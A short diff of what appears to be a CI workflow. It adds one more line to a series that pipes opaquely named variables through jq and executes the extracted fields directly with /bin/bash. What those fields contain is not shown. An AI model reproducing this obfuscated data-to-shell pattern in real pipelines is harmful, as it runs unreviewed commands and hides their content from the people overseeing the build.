@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$oyyo054" | jq -r .cgb11 | /bin/bash
           printf '%s' "$v0" | jq -r .tpc43453 | /bin/bash
           printf '%s' "$rp0" | jq -r .g7155 | /bin/bash
+          printf '%s' "$w28" | jq -r .vs942 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
